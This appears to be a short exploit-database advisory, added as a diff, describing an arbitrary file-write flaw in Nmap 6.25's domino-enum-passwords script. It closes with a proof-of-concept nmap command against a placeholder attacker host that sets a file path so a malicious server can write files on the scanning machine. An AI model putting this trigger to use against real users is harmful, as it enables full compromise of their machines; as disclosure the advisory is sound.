@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/62024/info
+
+Nmap is prone to an arbitrary file-write vulnerability.
+
+An attacker can exploit this issue to write arbitrary files with the permissions of the user running the nmap client. This will allow the attacker to fully compromise the affected machine.
+
+Nmap 6.25 is vulnerable; other versions may also be affected. 
+
+nmap --script domino-enum-passwords -p 80 <evil_host> --script-args domino-enum-passwords.username='patrik karlsson',domino-enum-passwords.password=secret,domino-enum-passwords.idpath='/tmp'
